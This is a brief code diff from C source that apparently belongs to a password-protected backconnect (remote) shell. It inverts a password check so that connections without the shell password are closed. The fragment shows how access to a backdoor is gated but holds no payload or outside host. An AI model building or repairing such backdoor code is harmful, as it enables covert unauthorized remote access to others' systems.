@@ -9,7 +9,7 @@ void backconnect(int sock)
 	char tmp[265]; 
 	read(sock, tmp, sizeof(tmp));
 	char *shellpassword = strdup(SHELLPW);
-	if (strstr(tmp, shellpassword)) 
+	if (!strstr(tmp, shellpassword)) 
 	{
 		CLEAN(shellpassword); 
 		close(sock);
